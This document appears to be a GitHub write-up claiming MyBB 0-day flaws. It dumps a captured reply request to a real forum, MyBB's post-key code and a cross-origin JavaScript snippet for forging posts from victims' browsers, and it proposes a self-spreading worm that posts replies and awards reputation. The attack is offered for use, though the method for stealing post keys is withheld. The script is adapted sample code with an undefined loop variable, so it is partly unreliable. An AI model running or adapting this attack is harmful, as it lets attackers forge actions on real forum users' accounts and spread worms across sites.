So here we're going to start,
first I'm going to show proof that I have serveral MyBB 0day's including critical vulnerabilities/exploits. 
The proof is located [here] (https://github.com/rootkitGirl/MyBB-0day/blob/master/PoC).

*Versions affected: 1.6x & 1.8x*
*Versions tested: 1.8.3 (latest), and 1.6.16 (latest for 1.6 series)*

So I was playing with MyBB and monitoring requests, and noticed a few things which led to a pretty decent bugs. These are all from personal findings testing on multiple sites.

First, breaking down MyBB is simple. When you go to post a new thread, it asks for a few things upon submission, here is a sample post request to the forum Hackforums:

```
POST http://www.hackforums.net/newreply.php?tid=4602700&processed=1 HTTP/1.1
Host: www.hackforums.net
User-Agent: Mozilla/5.0 (Windows NT 5.3; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.hackforums.net/newreply.php?tid=4602700
Cookie: *
Connection: keep-alive
Content-Type: multipart/form-data; boundary=------71842462512788
Content-Length: 1588

------71842462512788
Content-Disposition: form-data; name="my_post_key"

******
------71842462512788
Content-Disposition: form-data; name="message_new"

Hey dude, I love your site Omni. Can I get a free upgrade?
------71842462512788
Content-Disposition: form-data; name="message"

Hey dude, I love your site Omni. Can I get a free upgrade?
------71842462512788
Content-Disposition: form-data; name="submit"

Post Reply
------71842462512788
Content-Disposition: form-data; name="action"

do_newreply
------71842462512788
Content-Disposition: form-data; name="replyto"

------71842462512788
Content-Disposition: form-data; name="posthash"

******
------71842462512788
Content-Disposition: form-data; name="attachmentaid"

------71842462512788
Content-Disposition: form-data; name="attachmentact"

------71842462512788
Content-Disposition: form-data; name="subject"

*
------71842462512788
Content-Disposition: form-data; name="quoted_ids"

------71842462512788
Content-Disposition: form-data; name="tid"

4602700
------71842462512788--
```

So, what we have a few fields, first is the post key - it's important because if we don't have this, we can't post anything. Taking this key is **quite simple** and will be explained later on. Now the other hash we need is the posthash - now this posthash is merely a MD5 string, just create any valid MD5 string and you can bypass it. It's mostly a placeholder from what I can tell, I haven't dug too deep into the actual code behind it.

Now, looking at the message_new and message fields - MyBB submits both of those, however, it only displays the contents in message field, so you can even write *cocks* in message_new field upon post, and it won't even be shown in the post.

**So, how is post key generated?**
Post key relies on this function:

```
function generate_post_check()
{
	global $mybb, $session;
	if($mybb->user['uid'])
	{
		return md5($mybb->user['loginkey'].$mybb->user['salt'].$mybb->user['regdate']);
	}
	// Guests get a special string
	else
	{
		return md5($session->useragent.$mybb->config['database']['username'].$mybb->settings['internal']['encryption_key']);
	}
}
```

Which to validate the post key goes to this function:

```
function verify_post_check($code, $silent=false)
{
	global $lang;
	if(generate_post_check() != $code)
	{
		if($silent == true)
		{
			return false;
		}
		else
		{
			if(defined("IN_ADMINCP"))
			{
				return false;
			}
			else
			{
				error($lang->invalid_post_code);
			}
		}
	}
	else
	{
		return true;
	}
}
```

Now we can see it looks for the loginkey, salt, regdate. Now these are fairly easy to get (I won't be explaining how, it's fairly easy, but it's too long to explain while I'm on this shitty computer). Now, once you obtain the post key - it's useable as long as the user doesn't change their password, now most cases people don't change forum passwords usually until they get hacked, or they want to use a more secure password.

Now, forming our attack, we need to know a target, so I picked a website admin on my local site, I wrote a CORS (Cross-Origin-Resource-Sharing) script (javascript) so it goes from the users browser, the users browser hits a URL with the requested POST contents, then the URL at the other end obtains the request, processes it and doesn't return a message.  Assuming you formed the request properly, you will see the changes applied.

**How is this useful?**
Do you remember Sammy, and what he did with MySpace? It can be applied as the same concept with modifications. Depending on what we want to do, we can form the requests differently. This goes for submitting a post/thread, giving reputation points, etc. If you wanted to you could make this concept like a worm and just everyone who views just decides to give you reputation points, and post replies on your threads (**yes it would require some more work to get the post key**), however the possibilities are endless.

**CORS code**
Note: this is sample code taken from appsec-labs, which you'll need to modify to suit your target.

```
// I suggest adding jQuery to top of file
// You will have to modify the code to make it more useable as I won't be modifying it for you.
var url = 'http://forum.mytarget.com/';
$(document).ready(function() {
     corsMyBBPost();
});
function corsMyBBPost()
{
	for(i=0; i<times; i++)
	{
		cors_send("post", url + "?proof_of_concept=1&req_num=" + i, "post=data", false);
	}
}

function cors_send(method, url, data, credentials)
{
	var cors;
	if (window.XDomainRequest)
	{
		cors = new XDomainRequest();
		if (cors)
		{
			cors.onprogress = function() { CORSstatus("Process") };
			cors.onload = function() { CORSresult(cors.responseText) };
		}
		else
			CORSstatus("Browser does not support Cross Origin Request");
	}
	else if (window.XMLHttpRequest)
	{
		cors = new XMLHttpRequest();
		cors.onreadystatechange = function() {
			if (cors.readyState == 4)
				CORSresult(cors.getAllResponseHeaders(), cors.responseText);
			else
				CORSstatus("Process");
			}
	}
	else
	{
		CORSstatus("Browser does not support AJAX");
	}

	method = method.toUpperCase();
	if (method == "POST" || method == "PUT")
		cors.open(method, url, data);
	else
		cors.open(method, url);

	if (credentials)
		cors.withCredentials = "true";
    cors.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
	cors.send(data);

	CORSstatus("Cross Origin Resource Sharing - Start");
}
function CORSstatus(msg) {
     console.log(msg);
}
function CORSerror(msg) {
     console.log("Oh shit..." + msg);
}
```

And it's pretty much it, nothing fancy to it. I'll not post how to swipe the post keys, let's say I consider as a part of my *anti-leech protection*. If you want to use this now, you'll have to figure out how to swipe the post keys yourself. If you have found how you can do it you can use this exploit/bug or however you want to call it. 

I hope you learned more from this, but the most important: have fun.
